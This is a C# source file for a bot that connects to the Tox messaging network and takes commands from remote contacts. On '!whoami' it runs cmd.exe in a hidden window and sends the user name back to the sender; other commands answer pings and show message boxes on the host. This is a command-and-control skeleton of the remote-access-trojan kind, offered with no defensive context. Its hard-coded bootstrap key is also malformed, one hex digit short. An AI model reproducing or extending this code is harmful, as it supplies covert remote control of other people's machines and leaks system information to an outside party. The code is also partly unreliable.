using System;
using System.Diagnostics;
using Tox;
using System.Windows.Forms;

class Program
{
    static Tox tox;

    static void Main(string[] args)
    {
        tox = new Tox();

        // Connect to the Tox network
        tox.Bootstrap("node.tox.biribiri.org", 33445, new ToxKey("9535C4F7B144F4AB4D7E1F9BFB4E2F9E8E6779B1E3A64B7F8E8B07F2A3E3E3F"));

        // Register a callback for when a friend sends a message
        tox.OnFriendMessage += Tox_OnFriendMessage;

        while (true)
        {
            tox.Do();
            System.Threading.Thread.Sleep(tox.IterationInterval);
        }
    }

    static void Tox_OnFriendMessage(object sender, ToxEventArgs.FriendMessageEventArgs e)
    {
        string message = e.Message;

        if (message.StartsWith("!ping"))
        {
            tox.SendMessage(e.FriendNumber, "!pong");
        }
        else if (message.StartsWith("!whoami"))
        {
            string name = string.Empty;
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/C whoami";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
                name = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
            }
            tox.SendMessage(e.FriendNumber, "You are talking to " + name);
        }
        else if (message.StartsWith("!message"))
        {
            string text = message.Substring(8);
            MessageBox.Show(text);
        }
    }
}
